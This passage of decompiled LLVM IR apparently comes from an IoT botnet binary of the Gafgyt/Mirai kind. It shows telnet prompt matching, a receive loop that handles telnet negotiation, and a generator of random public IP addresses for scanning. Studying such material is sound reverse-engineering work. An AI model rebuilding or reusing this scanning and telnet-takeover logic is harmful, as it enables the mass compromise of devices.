define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a754 = call i32 @strlen(i8* %arg1)
  %v2_a79c = add i32 %v3_a754, %tmp
  br label %dec_label_pc_a870

dec_label_pc_a774:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a7d8, %dec_label_pc_a7b4, %dec_label_pc_a790
  %v1_a778 = add nsw i32 %stack_var_-28.013, 1
  %v7_a78c = icmp sgt i32 %v3_a754, %v1_a778
  br i1 %v7_a78c, label %dec_label_pc_a790, label %dec_label_pc_a820

dec_label_pc_a790:                                ; preds = %dec_label_pc_a780.preheader, %dec_label_pc_a774
  %stack_var_-28.013 = phi i32 [ %v1_a778, %dec_label_pc_a774 ], [ %stack_var_-28.1, %dec_label_pc_a780.preheader ]
  %v2_a7a4 = sub i32 %v2_a79c, %stack_var_-28.013
  %v1_a7a8 = inttoptr i32 %v2_a7a4 to i8*
  %v2_a7a8 = load i8, i8* %v1_a7a8, align 1
  %v2_a7ac = icmp eq i8 %v2_a7a8, 0
  br i1 %v2_a7ac, label %dec_label_pc_a774, label %dec_label_pc_a7b4

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a790
  %v2_a7cc = load i8, i8* %v1_a7a8, align 1
  %v7_a7d0 = icmp eq i8 %v2_a7cc, 32
  br i1 %v7_a7d0, label %dec_label_pc_a774, label %dec_label_pc_a7d8

dec_label_pc_a7d8:                                ; preds = %dec_label_pc_a7b4
  %v2_a7f0 = load i8, i8* %v1_a7a8, align 1
  %v7_a7f4 = icmp eq i8 %v2_a7f0, 13
  br i1 %v7_a7f4, label %dec_label_pc_a774, label %dec_label_pc_a7fc

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a7d8
  %v2_a814 = load i8, i8* %v1_a7a8, align 1
  %v7_a818 = icmp eq i8 %v2_a814, 10
  br i1 %v7_a818, label %dec_label_pc_a774, label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a774, %dec_label_pc_a780.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a780.preheader ], [ %stack_var_-28.013, %dec_label_pc_a7fc ], [ %v1_a778, %dec_label_pc_a774 ]
  %v2_a834 = sub i32 %v2_a79c, %stack_var_-28.0.lcssa
  %v1_a838 = inttoptr i32 %v2_a834 to i8*
  %v2_a838 = load i8, i8* %v1_a838, align 1
  %v2_a848 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1ee90.73 to i32)
  %v1_a84c = inttoptr i32 %v2_a848 to i8*
  %v2_a84c = load i8, i8* %v1_a84c, align 1
  %v9_a850 = icmp eq i8 %v2_a838, %v2_a84c
  %v1_a868 = add i32 %storemerge2, 1
  br i1 %v9_a850, label %dec_label_pc_a890, label %dec_label_pc_a870

dec_label_pc_a870:                                ; preds = %dec_label_pc_a820, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a820 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a868, %dec_label_pc_a820 ]
  %v3_a878 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ee90.73, i32 0, i32 0))
  %v3_a880 = icmp ult i32 %storemerge2, %v3_a878
  br i1 %v3_a880, label %dec_label_pc_a780.preheader, label %dec_label_pc_a890

dec_label_pc_a780.preheader:                      ; preds = %dec_label_pc_a870
  %v7_a78c12 = icmp sgt i32 %v3_a754, %stack_var_-28.1
  br i1 %v7_a78c12, label %dec_label_pc_a790, label %dec_label_pc_a820

dec_label_pc_a890:                                ; preds = %dec_label_pc_a870, %dec_label_pc_a820
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a820 ], [ 0, %dec_label_pc_a870 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a754, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a820, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a8ac = load i32, i32* @fp, align 4
  store i32 %v3_a8ac, i32* %stack_var_-16, align 4
  %v13_a8ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a8fc = ptrtoint i32* %stack_var_-168 to i32
  %v3_a93c = udiv i32 %arg1, 32
  %v3_a948 = mul nuw nsw i32 %v3_a93c, 4
  %v1_a960 = urem i32 %arg1, 32
  %v6_a968 = shl i32 1, %v1_a960
  %v1_a98c = add i32 %arg1, 1
  %v2_a994 = ptrtoint i32* %stack_var_-176 to i32
  %v6_aab4 = inttoptr i32 %arg2 to i8*
  %v2_aac8 = icmp eq i32 %arg3, 0
  %v1_aad4 = inttoptr i32 %arg6 to i8*
  %v5_ab18 = icmp sgt i32 %arg5, 0
  %v2_a950 = add nsw i32 %v3_a948, -152
  %v2_a954 = add i32 %v2_a950, %v13_a8ac
  %v1_a958 = inttoptr i32 %v2_a954 to i32*
  br label %dec_label_pc_aaf0

dec_label_pc_a910.lr.ph:                          ; preds = %dec_label_pc_ab04, %dec_label_pc_ab10
  br label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %dec_label_pc_a910.lr.ph, %dec_label_pc_a910
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a910.lr.ph ], [ %v1_a924, %dec_label_pc_a910 ]
  %v5_a91c = mul nuw nsw i32 %storemerge27, 4
  %v6_a91c = add i32 %v5_a91c, %v2_a8fc
  %v7_a91c = inttoptr i32 %v6_a91c to i32*
  store i32 0, i32* %v7_a91c, align 4
  %v1_a924 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a924, 32
  br i1 %tmp30, label %dec_label_pc_a910, label %dec_label_pc_a938

dec_label_pc_a938:                                ; preds = %dec_label_pc_a910
  %v2_a958 = load i32, i32* %v1_a958, align 4
  %v2_a96c = or i32 %v2_a958, %v6_a968
  store i32 %v2_a96c, i32* %v1_a958, align 4
  %v5_a9a8 = call i32 @__libc_select(i32 %v1_a98c, i32 %v2_a8fc, i32 0, i32 0, i32 %v2_a994)
  %tmp31 = icmp slt i32 %v5_a9a8, 1
  br i1 %tmp31, label %dec_label_pc_ab34, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a938
  %v2_a9c4 = add i32 %stack_var_-40.0, %arg6
  %v5_a9c8 = inttoptr i32 %v2_a9c4 to i8*
  %v6_a9dc = call i32 @__libc_recv(i32 %arg1, i32 %v2_a9c4, i32 1, i32 0, i32 %v2_a9c4)
  %v7_a9ec = icmp eq i32 %v6_a9dc, -1
  br i1 %v7_a9ec, label %dec_label_pc_aa00, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a9b8
  %v2_a9f8 = icmp eq i32 %v6_a9dc, 0
  br i1 %v2_a9f8, label %dec_label_pc_aa00, label %dec_label_pc_aa0c

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f4, %dec_label_pc_a9b8
  br label %dec_label_pc_ab3c

dec_label_pc_aa0c:                                ; preds = %dec_label_pc_a9f4
  %v2_aa14 = add i32 %v6_a9dc, %stack_var_-40.0
  %v2_aa20 = load i8, i8* %v5_a9c8, align 1
  %v2_aa24 = icmp eq i8 %v2_aa20, -1
  br i1 %v2_aa24, label %dec_label_pc_aa2c, label %dec_label_pc_aaac

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa0c
  %v1_aa30 = add i32 %v2_a9c4, 1
  %v5_aa44 = call i32 @__libc_recv(i32 %arg1, i32 %v1_aa30, i32 2, i32 0, i32 %v2_aa14)
  %v7_aa54 = icmp eq i32 %v5_aa44, -1
  br i1 %v7_aa54, label %dec_label_pc_aa68, label %dec_label_pc_aa5c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa2c
  %v2_aa60 = icmp eq i32 %v5_aa44, 0
  br i1 %v2_aa60, label %dec_label_pc_aa68, label %dec_label_pc_aa74

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_aa2c
  br label %dec_label_pc_ab3c

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa5c
  %v2_aa7c = add i32 %v5_aa44, %v2_aa14
  %v5_aa90 = call i32 @negotiate(i32 %arg1, i32 %v2_a9c4, i32 3, i32 %v2_aa7c, i32 %v2_aa7c)
  %v2_aa98 = icmp eq i32 %v5_aa90, 0
  br i1 %v2_aa98, label %dec_label_pc_aaa0, label %dec_label_pc_aaf0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa74
  br label %dec_label_pc_ab3c

dec_label_pc_aaac:                                ; preds = %dec_label_pc_aa0c
  %v7_aab4 = call i32 @strstr(i32 %arg6, i8* %v6_aab4)
  %v2_aabc = icmp eq i32 %v7_aab4, 0
  br i1 %v2_aabc, label %dec_label_pc_aac4, label %dec_label_pc_ab28

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaac
  br i1 %v2_aac8, label %dec_label_pc_aaf0, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac4
  %v2_aad4 = call i32 @matchPrompt(i8* %v1_aad4)
  %v2_aadc = icmp eq i32 %v2_aad4, 0
  br i1 %v2_aadc, label %dec_label_pc_aaf0, label %dec_label_pc_ab28

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aa74, %dec_label_pc_aad0, %dec_label_pc_aac4, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_aa7c, %dec_label_pc_aa74 ], [ %v2_aa14, %dec_label_pc_aac4 ], [ %v2_aa14, %dec_label_pc_aad0 ]
  %v1_aaf4 = add i32 %stack_var_-40.0, 2
  %v6_ab00 = icmp slt i32 %v1_aaf4, %arg7
  br i1 %v6_ab00, label %dec_label_pc_ab04, label %dec_label_pc_ab34

dec_label_pc_ab04:                                ; preds = %dec_label_pc_aaf0
  %v3_ab04 = load i32, i32* %stack_var_-176, align 4
  %v5_ab0c = icmp sgt i32 %v3_ab04, 0
  br i1 %v5_ab0c, label %dec_label_pc_a910.lr.ph, label %dec_label_pc_ab10

dec_label_pc_ab10:                                ; preds = %dec_label_pc_ab04
  br i1 %v5_ab18, label %dec_label_pc_a910.lr.ph, label %dec_label_pc_ab34

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aaac, %dec_label_pc_aad0
  br label %dec_label_pc_ab3c

dec_label_pc_ab34:                                ; preds = %dec_label_pc_a938, %dec_label_pc_ab10, %dec_label_pc_aaf0
  br label %dec_label_pc_ab3c

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aaa0, %dec_label_pc_aa68, %dec_label_pc_aa00, %dec_label_pc_ab34
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_ab34 ], [ 1, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa00 ], [ 0, %dec_label_pc_aa68 ], [ 0, %dec_label_pc_aaa0 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_aa44, { 1, 2, 0 }
  uselistorder i32 %v6_a9dc, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a8fc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_ab3c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ab34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aaf0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a910, { 1, 0 }
  uselistorder label %dec_label_pc_a910.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ab54 = load i32, i32* @fp, align 4
  store i32 43868, i32* %stack_var_-4, align 4
  %v2_ab58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ab58, i32* @fp, align 4
  store i8 0, i8* bitcast (i32* @global_var_2a547.76 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_2a548.77 to i8*), align 4
  store i8 0, i8* @global_var_2a549.78, align 1
  store i8 0, i8* @global_var_2a54a.79, align 1
  %v0_ab90 = call i32 @rand()
  %v2_abac = sdiv i32 %v0_ab90, 51
  %tmp219 = mul i32 %v2_abac, -255
  %v2_abc4 = add i32 %tmp219, %v0_ab90
  %v1_abd8 = trunc i32 %v2_abc4 to i8
  store i8 %v1_abd8, i8* bitcast (i32* @global_var_2a547.76 to i8*), align 4
  %v0_abdc = call i32 @rand()
  %v2_abf8 = sdiv i32 %v0_abdc, 51
  %tmp220 = mul i32 %v2_abf8, -255
  %v2_ac10 = add i32 %tmp220, %v0_abdc
  %v1_ac24 = trunc i32 %v2_ac10 to i8
  store i8 %v1_ac24, i8* bitcast (i32* @global_var_2a548.77 to i8*), align 4
  %v0_ac28 = call i32 @rand()
  %v2_ac44 = sdiv i32 %v0_ac28, 51
  %tmp221 = mul i32 %v2_ac44, -255
  %v2_ac5c = add i32 %tmp221, %v0_ac28
  %v1_ac70 = trunc i32 %v2_ac5c to i8
  store i8 %v1_ac70, i8* @global_var_2a549.78, align 1
  %v0_ac74 = call i32 @rand()
  %v2_ac90 = sdiv i32 %v0_ac74, 51
  %tmp222 = mul i32 %v2_ac90, -255
  %v2_aca8 = add i32 %tmp222, %v0_ac74
  %v1_acbc = trunc i32 %v2_aca8 to i8
  store i8 %v1_acbc, i8* @global_var_2a54a.79, align 1
  %v0_acc0 = call i32 @rand()
  %v2_acd8 = srem i32 %v0_acc0, 208
  %v2_ad00 = icmp eq i32 %v2_acd8, 0
  br i1 %v2_ad00, label %dec_label_pc_ad08, label %dec_label_pc_ad30

dec_label_pc_ad08:                                ; preds = %entry
  %v2_ad08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad14 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ad20 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ad2c = sext i8 %v3_ad14 to i32
  %v6_ad2c = sext i8 %v3_ad20 to i32
  %v8_ad2c = call i32 @szprintf(i32 %v2_ad08, i32 ptrtoint ([12 x i8]* @global_var_1ee98.83 to i32), i32 %v4_ad2c, i32 %v6_ad2c, i32 0)
  br label %dec_label_pc_ad30

dec_label_pc_ad30:                                ; preds = %entry, %dec_label_pc_ad08
  %v7_ad34 = icmp eq i32 %v2_acd8, 1
  br i1 %v7_ad34, label %dec_label_pc_ad3c, label %dec_label_pc_ad64

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_ad30
  %v2_ad3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad48 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ad54 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ad60 = sext i8 %v3_ad48 to i32
  %v6_ad60 = sext i8 %v3_ad54 to i32
  %v8_ad60 = call i32 @szprintf(i32 %v2_ad3c, i32 ptrtoint ([14 x i8]* @global_var_1eea4.85 to i32), i32 %v4_ad60, i32 %v6_ad60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ad30, %dec_label_pc_ad3c
  %v7_ad68 = icmp eq i32 %v2_acd8, 2
  br i1 %v7_ad68, label %dec_label_pc_ad70, label %dec_label_pc_ad98

dec_label_pc_ad70:                                ; preds = %dec_label_pc_ad64
  %v2_ad70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad7c = load i8, i8* @global_var_2a549.78, align 1
  %v3_ad88 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ad94 = sext i8 %v3_ad7c to i32
  %v6_ad94 = sext i8 %v3_ad88 to i32
  %v8_ad94 = call i32 @szprintf(i32 %v2_ad70, i32 ptrtoint ([11 x i8]* @global_var_1eeb4.87 to i32), i32 %v4_ad94, i32 %v6_ad94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad98

dec_label_pc_ad98:                                ; preds = %dec_label_pc_ad64, %dec_label_pc_ad70
  %v7_ad9c = icmp eq i32 %v2_acd8, 3
  br i1 %v7_ad9c, label %dec_label_pc_ada4, label %dec_label_pc_adcc

dec_label_pc_ada4:                                ; preds = %dec_label_pc_ad98
  %v2_ada4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adb0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_adbc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_adc8 = sext i8 %v3_adb0 to i32
  %v6_adc8 = sext i8 %v3_adbc to i32
  %v8_adc8 = call i32 @szprintf(i32 %v2_ada4, i32 ptrtoint ([13 x i8]* @global_var_1eec0.89 to i32), i32 %v4_adc8, i32 %v6_adc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_adcc

dec_label_pc_adcc:                                ; preds = %dec_label_pc_ad98, %dec_label_pc_ada4
  %v7_add0 = icmp eq i32 %v2_acd8, 4
  br i1 %v7_add0, label %dec_label_pc_add8, label %dec_label_pc_ae00

dec_label_pc_add8:                                ; preds = %dec_label_pc_adcc
  %v2_add8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ade4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_adf0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_adfc = sext i8 %v3_ade4 to i32
  %v6_adfc = sext i8 %v3_adf0 to i32
  %v8_adfc = call i32 @szprintf(i32 %v2_add8, i32 ptrtoint ([11 x i8]* @global_var_1eed0.91 to i32), i32 %v4_adfc, i32 %v6_adfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae00

dec_label_pc_ae00:                                ; preds = %dec_label_pc_adcc, %dec_label_pc_add8
  %v7_ae04 = icmp eq i32 %v2_acd8, 5
  br i1 %v7_ae04, label %dec_label_pc_ae0c, label %dec_label_pc_ae34

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_ae00
  %v2_ae0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae18 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ae24 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ae30 = sext i8 %v3_ae18 to i32
  %v6_ae30 = sext i8 %v3_ae24 to i32
  %v8_ae30 = call i32 @szprintf(i32 %v2_ae0c, i32 ptrtoint ([13 x i8]* @global_var_1eedc.93 to i32), i32 %v4_ae30, i32 %v6_ae30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae34

dec_label_pc_ae34:                                ; preds = %dec_label_pc_ae00, %dec_label_pc_ae0c
  %v7_ae38 = icmp eq i32 %v2_acd8, 6
  br i1 %v7_ae38, label %dec_label_pc_ae40, label %dec_label_pc_ae68

dec_label_pc_ae40:                                ; preds = %dec_label_pc_ae34
  %v2_ae40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae4c = load i8, i8* @global_var_2a549.78, align 1
  %v3_ae58 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ae64 = sext i8 %v3_ae4c to i32
  %v6_ae64 = sext i8 %v3_ae58 to i32
  %v8_ae64 = call i32 @szprintf(i32 %v2_ae40, i32 ptrtoint ([12 x i8]* @global_var_1eeec.95 to i32), i32 %v4_ae64, i32 %v6_ae64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae68

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae34, %dec_label_pc_ae40
  %v7_ae6c = icmp eq i32 %v2_acd8, 7
  br i1 %v7_ae6c, label %dec_label_pc_ae74, label %dec_label_pc_ae9c

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae68
  %v2_ae74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae80 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ae8c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ae98 = sext i8 %v3_ae80 to i32
  %v6_ae98 = sext i8 %v3_ae8c to i32
  %v8_ae98 = call i32 @szprintf(i32 %v2_ae74, i32 ptrtoint ([13 x i8]* @global_var_1eef8.97 to i32), i32 %v4_ae98, i32 %v6_ae98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae68, %dec_label_pc_ae74
  %v7_aea0 = icmp eq i32 %v2_acd8, 8
  br i1 %v7_aea0, label %dec_label_pc_aea8, label %dec_label_pc_aed0

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae9c
  %v2_aea8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aeb4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_aec0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_aecc = sext i8 %v3_aeb4 to i32
  %v6_aecc = sext i8 %v3_aec0 to i32
  %v8_aecc = call i32 @szprintf(i32 %v2_aea8, i32 ptrtoint ([13 x i8]* @global_var_1ef08.99 to i32), i32 %v4_aecc, i32 %v6_aecc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed0

dec_label_pc_aed0:                                ; preds = %dec_label_pc_ae9c, %dec_label_pc_aea8
  %v7_aed4 = icmp eq i32 %v2_acd8, 9
  br i1 %v7_aed4, label %dec_label_pc_aedc, label %dec_label_pc_af04

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aed0
  %v2_aedc = ptrtoint i32* %stack_var_-36 to i32
  %v3_aee8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_aef4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_af00 = sext i8 %v3_aee8 to i32
  %v6_af00 = sext i8 %v3_aef4 to i32
  %v8_af00 = call i32 @szprintf(i32 %v2_aedc, i32 ptrtoint ([13 x i8]* @global_var_1ef18.101 to i32), i32 %v4_af00, i32 %v6_af00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aed0, %dec_label_pc_aedc
  %v7_af08 = icmp eq i32 %v2_acd8, 10
  br i1 %v7_af08, label %dec_label_pc_af10, label %dec_label_pc_af38

dec_label_pc_af10:                                ; preds = %dec_label_pc_af04
  %v2_af10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af1c = load i8, i8* @global_var_2a549.78, align 1
  %v3_af28 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_af34 = sext i8 %v3_af1c to i32
  %v6_af34 = sext i8 %v3_af28 to i32
  %v8_af34 = call i32 @szprintf(i32 %v2_af10, i32 ptrtoint ([14 x i8]* @global_var_1ef28.103 to i32), i32 %v4_af34, i32 %v6_af34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af38

dec_label_pc_af38:                                ; preds = %dec_label_pc_af04, %dec_label_pc_af10
  %v7_af3c = icmp eq i32 %v2_acd8, 11
  br i1 %v7_af3c, label %dec_label_pc_af44, label %dec_label_pc_af6c

dec_label_pc_af44:                                ; preds = %dec_label_pc_af38
  %v2_af44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af50 = load i8, i8* @global_var_2a549.78, align 1
  %v3_af5c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_af68 = sext i8 %v3_af50 to i32
  %v6_af68 = sext i8 %v3_af5c to i32
  %v8_af68 = call i32 @szprintf(i32 %v2_af44, i32 ptrtoint ([11 x i8]* @global_var_1ef38.105 to i32), i32 %v4_af68, i32 %v6_af68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af6c

dec_label_pc_af6c:                                ; preds = %dec_label_pc_af38, %dec_label_pc_af44
  %v7_af70 = icmp eq i32 %v2_acd8, 12
  br i1 %v7_af70, label %dec_label_pc_af78, label %dec_label_pc_afa0

dec_label_pc_af78:                                ; preds = %dec_label_pc_af6c
  %v2_af78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af84 = load i8, i8* @global_var_2a549.78, align 1
  %v3_af90 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_af9c = sext i8 %v3_af84 to i32
  %v6_af9c = sext i8 %v3_af90 to i32
  %v8_af9c = call i32 @szprintf(i32 %v2_af78, i32 ptrtoint ([13 x i8]* @global_var_1ef44.107 to i32), i32 %v4_af9c, i32 %v6_af9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa0

dec_label_pc_afa0:                                ; preds = %dec_label_pc_af6c, %dec_label_pc_af78
  %v7_afa4 = icmp eq i32 %v2_acd8, 13
  br i1 %v7_afa4, label %dec_label_pc_afac, label %dec_label_pc_afd4

dec_label_pc_afac:                                ; preds = %dec_label_pc_afa0
  %v2_afac = ptrtoint i32* %stack_var_-36 to i32
  %v3_afb8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_afc4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_afd0 = sext i8 %v3_afb8 to i32
  %v6_afd0 = sext i8 %v3_afc4 to i32
  %v8_afd0 = call i32 @szprintf(i32 %v2_afac, i32 ptrtoint ([13 x i8]* @global_var_1ef54.109 to i32), i32 %v4_afd0, i32 %v6_afd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd4

dec_label_pc_afd4:                                ; preds = %dec_label_pc_afa0, %dec_label_pc_afac
  %v7_afd8 = icmp eq i32 %v2_acd8, 14
  br i1 %v7_afd8, label %dec_label_pc_afe0, label %dec_label_pc_b008

dec_label_pc_afe0:                                ; preds = %dec_label_pc_afd4
  %v2_afe0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afec = load i8, i8* @global_var_2a549.78, align 1
  %v3_aff8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b004 = sext i8 %v3_afec to i32
  %v6_b004 = sext i8 %v3_aff8 to i32
  %v8_b004 = call i32 @szprintf(i32 %v2_afe0, i32 ptrtoint ([13 x i8]* @global_var_1ef64.111 to i32), i32 %v4_b004, i32 %v6_b004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b008

dec_label_pc_b008:                                ; preds = %dec_label_pc_afd4, %dec_label_pc_afe0
  %v7_b00c = icmp eq i32 %v2_acd8, 15
  br i1 %v7_b00c, label %dec_label_pc_b014, label %dec_label_pc_b03c

dec_label_pc_b014:                                ; preds = %dec_label_pc_b008
  %v2_b014 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b020 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b02c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b038 = sext i8 %v3_b020 to i32
  %v6_b038 = sext i8 %v3_b02c to i32
  %v8_b038 = call i32 @szprintf(i32 %v2_b014, i32 ptrtoint ([13 x i8]* @global_var_1ef74.113 to i32), i32 %v4_b038, i32 %v6_b038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b03c

dec_label_pc_b03c:                                ; preds = %dec_label_pc_b008, %dec_label_pc_b014
  %v7_b040 = icmp eq i32 %v2_acd8, 16
  br i1 %v7_b040, label %dec_label_pc_b048, label %dec_label_pc_b070

dec_label_pc_b048:                                ; preds = %dec_label_pc_b03c
  %v2_b048 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b054 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b060 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b06c = sext i8 %v3_b054 to i32
  %v6_b06c = sext i8 %v3_b060 to i32
  %v8_b06c = call i32 @szprintf(i32 %v2_b048, i32 ptrtoint ([13 x i8]* @global_var_1ef84.115 to i32), i32 %v4_b06c, i32 %v6_b06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b070

dec_label_pc_b070:                                ; preds = %dec_label_pc_b03c, %dec_label_pc_b048
  %v7_b074 = icmp eq i32 %v2_acd8, 17
  br i1 %v7_b074, label %dec_label_pc_b07c, label %dec_label_pc_b0a4

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b070
  %v2_b07c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b088 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b094 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b0a0 = sext i8 %v3_b088 to i32
  %v6_b0a0 = sext i8 %v3_b094 to i32
  %v8_b0a0 = call i32 @szprintf(i32 %v2_b07c, i32 ptrtoint ([13 x i8]* @global_var_1ef94.117 to i32), i32 %v4_b0a0, i32 %v6_b0a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a4

dec_label_pc_b0a4:                                ; preds = %dec_label_pc_b070, %dec_label_pc_b07c
  %v7_b0a8 = icmp eq i32 %v2_acd8, 18
  br i1 %v7_b0a8, label %dec_label_pc_b0b0, label %dec_label_pc_b0d8

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b0a4
  %v2_b0b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0bc = load i8, i8* @global_var_2a549.78, align 1
  %v3_b0c8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b0d4 = sext i8 %v3_b0bc to i32
